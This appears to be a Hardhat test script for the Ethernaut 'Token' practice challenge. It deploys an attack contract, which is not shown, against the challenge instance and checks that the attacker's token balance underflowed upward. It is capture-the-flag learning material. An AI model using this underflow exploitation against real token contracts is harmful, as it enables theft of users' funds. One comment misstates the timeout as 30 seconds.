const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Token Exploit using attack contract", function () {
  let tokenContract, attacker, contractAddress, balance;

  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0xe3B79bd6899E51E0eDE3DB94ea0192B8E0023a3c"; //instance address
    // Deploy my own attacker contract
    const attackerContractFactory = await ethers.getContractFactory("Attack");
    attackerContract = await attackerContractFactory.deploy(contractAddress);

    await attackerContract.deployed();

    // insert contract address of ethernaut challenge
    tokenContract = await ethers.getContractAt("Token", contractAddress);

    console.log("the token contract is this", tokenContract);
  });

  it("perform exploit", async function () {
    // Attack flow
    // 1) I want to see the balance of my attacker address should = 20

    let originalBalance = await tokenContract.balanceOf(attacker.address);

    console.log(`The original balance is ${originalBalance}`);
    // 2) we want to call the transfer function and list our own address as the _to address
    let txAttack = await attackerContract.attackOne(attacker.address);

    let receiptTxTransfer = await txAttack.wait();

    console.log(
      `The transfer tx is ${txAttack} and the receipt is ${receiptTxTransfer}`
    );
    // 3) Grab the balance of my attacker address after the malicious transaction is called

    balance = await tokenContract.balanceOf(attacker.address);

    console.log(`The balance of the attacker address (EOA) = ${balance}`);

    // 4)grab the balance of the attack contract

    let balancOfAttackContract = await tokenContract.balanceOf(
      attackerContract.address
    );

    console.log("balance of attacker contract is ", balancOfAttackContract);

    // grab the newOwner of the victim contract
  }).timeout(3000000); //Allows the attack to be ran for 30 seconds

  after("confirm exploit", async function () {
    // check if balance successfully underflowed
    expect(balance).to.be.gte("20");
  });
});
